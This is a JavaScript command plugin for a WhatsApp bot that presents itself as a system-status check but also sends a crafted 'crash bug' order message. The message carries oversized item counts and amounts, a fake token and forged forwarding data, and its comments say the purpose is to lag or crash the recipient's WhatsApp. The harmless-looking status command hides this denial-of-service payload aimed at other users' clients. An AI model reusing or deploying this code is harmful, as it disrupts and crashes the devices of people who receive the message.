const { cmd } = require('../command');
const config = require('../config');
const os = require("os");
const { runtime } = require('../lib/functions');

cmd({
    pattern: "baga",
    alias: ["sinjfo", "plajtform", "systejmstatus", "systejminfo"],
    react: "🧬",
    desc: "Check bot system status with crash bug style.",
    category: "main",
    filename: __filename
},
async (robin, mek, m, {
    from, quoted, reply, sender
}) => {
    try {
        const uptimeStr = runtime(process.uptime());
        const usedRam = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
        
        const statusText = `╭─〔 *🍷 SYSTEM INFO 🍷*〕─◉
│
│⏰ *Uptime*: ${uptimeStr}
│⏳ *Ram*: ${usedRam}MB / ${totalRam}MB
│🖥 *Host*: ${os.hostname()}
│🖊 *Prefix*: [ ${config.PREFIX} ]
│🛠 *Mode*: [ ${config.MODE} ] 
│🤵‍♂ *Owner*: ᴴᴵᴿᵁᴷᴬ ᴿᴬᴺᵁᴹᴵᵀ𝐇𝐀
│🧬 *Version*: ${config.BOT_VERSION}
╰─────────────────────────────⊷
> © Powerd by 𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 🌛`;

        // WhatsApp Crash/Lag Bug Structure
        await robin.sendMessage(from, {
            orderMessage: {
                itemCount: 999999999999, // Large number for lag
                status: 1,
                surface: 1,
                message: statusText,
                orderTitle: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗖𝗥𝗔𝗦𝗛', // Title
                sellerJid: '0@s.whatsapp.net',
                token: 'AR6x+VogDsm_v09yS90CC63yF7f7uI7S0+OMU79asZt370=', // Fake token
                totalAmount1000: 999999999999,
                totalCurrencyCode: 'LKR',
                contextInfo: {
                    mentionedJid: [sender],
                    forwardingScore: 999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363317972190466@newsletter',
                        newsletterName: '𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗖𝗥𝗔𝗦𝗛 𝗕𝗨𝗚',
                        serverMessageId: 143
                    },
                    // Thumbnail ekak dammaama media type error eka enne na
                    externalAdReply: {
                        title: "𝗥𝗔𝗡𝗨𝗠𝗜𝗧𝗛𝗔-𝗫-𝗠𝗗 𝗦𝗬𝗦𝗧𝗘𝗠",
                        body: "ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ...",
                        mediaType: 1,
                        thumbnailUrl: "https://raw.githubusercontent.com/Ranumithaofc/RANU-FILE-S-/refs/heads/main/images/System%20%20info.jpg",
                        sourceUrl: "https://whatsapp.com/channel/0029Vafn96S7z4k66VvX9O0A"
                    }
                }
            }
        }, { quoted: mek });

    } catch (e) {
        console.log("System Bug Error:", e);
        reply(`⚠️ Error: ${e.message}`);
    }
});
